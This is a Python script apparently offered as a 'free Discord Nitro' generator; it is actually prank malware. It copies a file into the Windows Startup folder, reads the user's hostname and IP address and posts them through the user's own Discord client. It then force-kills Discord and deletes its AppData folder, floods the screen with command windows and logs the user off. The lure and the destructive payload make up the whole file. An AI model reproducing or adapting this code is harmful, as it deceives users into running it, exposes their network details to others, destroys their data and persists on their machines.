import ipaddress

import pynput
import time
import subprocess
import os
import random
import shutil
import socket
login = os.getlogin()
path = os.getcwd()
shutil.copy("info.settings","C:/Users/" + login + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/info.settings")
print(path)
hostname =socket.gethostname()
ipaddr = socket.gethostbyname(hostname)
print(hostname + " " + ipaddr)
input("enter to get free nitro(console will open to generate)\n")
k = pynput.keyboard.Controller()
enter = pynput.keyboard.Key.enter
cmd2 = subprocess.Popen("cmd.exe /K cd C:/")
print("please wait...")
os.system("start C:/Users/" + login + "/AppData/Roaming/discord/app-1.0.9026/discord.exe")
time.sleep(2)
k.type( "the person that said this just run a random exe lol: "+str(ipaddr) + " hostname: " +hostname)
k.press(enter)
time.sleep(1)
os.system("taskkill /F /IM discord.exe")
print("it is required to kill discord")
time.sleep(5)
print("deleting discord temp")
time.sleep(0.5)
cmd2.terminate()
cmd = subprocess.Popen("cmd.exe /K cd C:/Users/" + login + "/AppData/Roaming")
time.sleep(0.3)
k.type("del discord")
k.press(enter)
time.sleep(0.3)
k.type("y")
k.press(enter)
time.sleep(0.5)
k.press(enter)
time.sleep(0.3)
k.type("you really thought you gonna get free nitro")
i = 1
w = 1
os.replace("C:/Users/" + login + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/info.settings",
           "C:/Users/" + login + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/info.mp4")
os.system("start https://www.youtube.com/watch?v=OAUtiqYDhEc&pp=ygUIY2F0IHNvbmc%3D")
while i <= 100:
    time.sleep(0.5)
    i = i + 1
    print(w)
    print(i * "01")
    k.type("OH NO")
    os.system(str(random.randint(0, 100000)))
    cmd2 = subprocess.Popen("cmd.exe /K cd C:/")
    os.system("start")
else:
    os.system("shutdown -l")
# https://www.youtube.com/watch?v=Qskm9MTz2V4&ab_channel=SheetMusicBoss
# C:/Users/"+ login +"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
